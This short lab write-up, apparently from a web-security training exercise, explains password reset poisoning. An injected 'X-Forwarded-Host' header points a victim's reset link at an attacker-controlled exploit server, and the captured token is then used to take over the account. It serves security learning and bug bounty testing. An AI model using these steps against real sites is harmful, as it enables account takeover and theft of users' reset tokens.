## LAB: Password Reset Poisoning via Middleware

**Vulnerability:** Broken Authentication - X-Forwarded-Host header redirects password reset link to attacker server

**Steps:**
- Trigger password reset for your own account and observe the reset link structure
- Send the forgot-password POST request to Repeater
- Add `X-Forwarded-Host: your-exploit-server.com` header
- Change username parameter to target user and send
- Check exploit server access log for target's reset link containing their unique token
- Use token in the reset URL to set a new password for their account

**Key headers:**
- `X-Forwarded-Host: [your exploit server]`

**Bug Bounty Testing:** Always test if password reset requests
honor `X-Forwarded-Host` or `X-Forwarded-For`, if the reset link is
dynamically generated using that header, you can redirect it to a
server you control
